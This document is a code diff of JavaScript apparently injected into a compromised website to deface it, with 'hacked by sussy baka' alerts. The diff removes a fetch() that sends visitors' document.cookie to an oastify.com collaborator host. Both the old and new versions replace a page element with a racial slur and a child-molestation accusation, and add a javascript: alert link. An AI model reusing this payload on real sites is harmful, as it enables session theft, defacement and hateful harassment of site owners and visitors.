@@ -17,22 +17,23 @@ document.body.innerHTML += `
 `
 
 let name;
+let bio;
 
 if(window.location.href.includes("vo-ar")){    
 
-    document.body.querySelector('.sss').innerHTML = '<iframe height=720px width=720px src="https://www.redgifs.com/">'
+    bio = `<div style="text-align: center;">
+      <h1 class="rainbow">ong bro fr fr</h1>
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOH0bZmlg2qCF8cGIaHaPkj3JhTByKqKXwXojYQzB3uw&s" alt="">
+    </div>`
+
+    document.body.querySelector('.sss').innerHTML = bio;
     
     name = document.querySelector(".f-s-25");
-    name.innerHTML = `<a href="javascript:alert('nya~ my pussy >_<')" class="rainbow">Click Me :D</a>`
-    document.querySelectorAll('a').forEach(el => {el.style.color='red'})
-    document.querySelector(".naskh-r").textContent = 'nigger | certified child molester'
-    fetch('https://ugeghou8kuk2odes18yxe3gsfjla90xp.oastify.com', {
-      method: 'POST',
-      mode: 'no-cors', 
-      body: document.cookie
-});
+    name.innerHTML = `<a href="javascript:alert('>_< nyaa~')" class="rainbow">Click Me :D</a>`
+    document.querySelectorAll('a').forEach(el => {el.style.color='pink'})
+    document.querySelectorAll(".naskh-r").textContent = 'nigger | certified child lover'
 }
 else {
-    alert("hacked by sussy baka")
+    alert("this site is not properly secured, your accounts / info may be in danger - sussy baka")
 }
 
